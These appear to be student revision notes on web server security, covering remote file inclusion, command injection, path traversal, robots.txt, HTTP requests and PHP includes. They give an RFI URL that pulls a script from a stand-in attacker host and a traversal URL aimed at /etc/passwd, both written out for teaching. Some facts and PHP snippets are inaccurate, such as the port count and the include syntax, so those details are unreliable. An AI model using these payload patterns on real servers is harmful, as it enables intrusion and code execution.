---
layout: CS140
title: Web Server Security Issues
part: true
---

A large part of this topic was meant for us to understand more about the interactions between a client and the web server – which was relevant for our coursework at the time. That said, the module organiser has mentioned that security issues related to the web server may be tested in the exam. 

What I have done is included the main security issues at the top of this page, however if there is trouble understanding somethings then you might need to read the sections to understand more about PHP, HTTP requests, Client and Web Server interaction etc. 

## Remote File Inclusion (RFI) Vulnerability

If the URL sent by the user is:

http://yoursite.com/index.php?page=http://ev.il/badscript.php?

include `$_GET[‘page’]”.html”` becomes:

```
include http://ev.il/badscript.php?.html
```

What happens is that `badscript.php` will be run, because the content after “?” will be interpreted as input parameter of the php script. 

## Forms

> A **form** is used to pass information from a web browser to a web server. 

There are 2 different ways to submit a form, GET or POST. Especially when forms contain sensitive information, POST is **always safer** than GET. When a form is sent:

- GET request will have form parameters encoded in the head of the HTTP request as the address of the resource that we want to access. 
- POST requests will have the form parameters placed in the body of the HTTP requests. More **secure** because we can encrypt the HTTP request.

### Call OS commands in PHP

When using PHP, sometimes developers make the mistake of running shell commands through the PHP file that has a parameter/variable that depends on **form inputs**. 

> This is a potential vulnerability as an attacker can send code through these inputs and can make the web server OS perform commands that could compromise security.

## Path Exploits

Path exploits try to enter the directory or access files that are not intended to be accessible. 

For example, if the user in put the web address:

http://www.example.com/home/users/.../etc/passwd

Without proper configuration, the passwd file will be displayed. When allow `_url_fopen` (a directive in the php configuration file - php.ini) is set to “on” – User’s will be allowed to retrieve and display the file in server, even if the file is not a typical web page (e.g. html or php).

## Robot Exclusion Protocol

> Web crawlers or Web robots systematically scan the World Wide Web to mine data.
>
> Robot Exclusion Protocol (REP) specifies which directories of the website that the robot should not scan. 

Instructions are written in the robots.txt file, which is in the root directory of the web server. Example:

```txt
User-agent:* # apply to all robots
Disallow:/local/secure.html

User-agents:Googlebot # apply only to Googlebot
Disallow:/private/
```

When there is sensitive data, we should exclude robots from crawling those files.

## Accompanying resources

That concludes the content covering potential security issues related to web servers. The content below is an additional resource to give background information about the Web Servers, PHP and HTTP requests. I recommend that you give it a read if you’re not confident in your knowledge of this topic.

### Interaction between Client and Web Server

In general there are 5 main steps between client and server

1. User issues URL from a browser
2. Browser sends a request message
3. Server maps the URL to a file or program under the document directory
4. Server returns a response message
5. Browser formats the response and displays

### HTTP Request

When a client types a URL address into the browser, our browser composes a message such as

```http
GET /docs/index/.html HTTP/1.1
Host: www.nowhere123.com
Accept: image/gif, image/jpeg, */*
Accept-Language: en-us
Accept-Encoding: gzip, deflate
User-Agent: Mozzila/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
{blank line}
```

The message consists of a number of lines. The first line is the request line. 

- **Format**: <u>message_name</u>  <u>request-uri</u> (address of the resource we want to access)  <u>HTTP-version</u>. 
- In the example this is the first line.

Request line is followed by request headers

- **Format**: <u>name</u> : <u>value</u> pairs
- In the example this is the 2nd line. Name is "Host". Value is "www.nowhere123.com"

Request line and request headers are together called request message header, followed by request message body. In the example above, the request message body is blank. 

#### HTTP Request Methods

- HTTP protocol defines a set of request methods.
  - in the example above, the message is **GET** - when we type an address in the browser search bar, we always trigger a GET request. 

**Methods supported by web server**

- **GET** : get a web resource from the server
- **HEAD**: get the header that a GET request would have obtained
- **POST**: Used to post the data up to the web server
- **PUT**: Ask the server to store the data
- **DELETE**: Ask the server to delete the data
- **OPTIONS**: Ask the server to request the list of request methods it supports

#### How HTTP server process requests

##### Listening

HTTP server listens to the port(s) specified in the configuration file of the server

- Port is the endpoint communication destination and is associated to a process/service
  - the request arriving at a certain port will be processed by the associated service
- port is a 16 bit number- there are 66536 ports in a computer
- http: 80, ssh: 22, ftp: 21, smtp: 25, etc. 

##### Processing 

After the server receives the request there are three general ways to process to request

1. map the request to a **file** in the directory in the server, and returns the file to the client
2. map the request to a **program** in the server, executes the program, and returns the output of the program to the client. (e.g. post request, CGI)
3. the request cannot be satisfied, the server returns an **error** message. 

If the webpage is HTML file, CGI is one way to invoke a program in the server. If we use PHP to write a webpage we can embed functions in the web page. PHP is a tool for making dynamic web pages. 

### PHP

A section in HTML file. Here is an example:

```php+HTML
<?php
echo My first PHP 
?>
```

**Dynamic file loading in PHP**

Suppose the link of your website is: http://yoursite.com/index.php

In the webpage, there is the following php code:

```php+HTML
<?php include $_GET['page']".html"; ?>
```

PHP supports loading a file based on data passed via the URL parameter.

When the user types the following web address:

http://yoursite/com/index.php?page=photos

- The content after “?” is interpreted as the parameter of the request
- i.e. index.php is run with “page=photos” as input parameter. 

Lets look more at `include $_GET['page']".html`: 

In PHP there are internal arrays which are used to hold information that are passed from the client. The `$_` tells PHP that we are trying to access an array and `GET['page']` tells PHP we are trying to access the `page` variable in the `GET` array. The `include` statement loads “photos.html” because we pass page=photos.

It is a dynamic web page, because the same source of the web page displays different content depending on the user’s input

For example, if the user types `page=contact`, then contact.html page will be loaded instead.

